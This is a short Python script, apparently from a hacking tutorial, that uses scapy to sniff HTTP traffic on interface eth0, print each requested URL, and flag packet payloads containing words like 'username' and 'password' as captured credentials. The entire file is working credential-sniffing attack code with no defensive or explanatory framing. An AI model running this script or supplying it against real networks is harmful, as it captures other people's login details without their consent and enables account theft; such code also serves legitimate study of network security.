#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def scrape_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def scrape_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "password", "pass", "login", "user"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = scrape_url(packet)
        print("[*] HTTP REQUEST [*]", url)

        login_info = scrape_login(packet)
        if login_info:
            print("\n\n" + "[*] POSSIBLE USERNAME/PASSWORD [*]" + login_info + "\n\n")


sniff("eth0")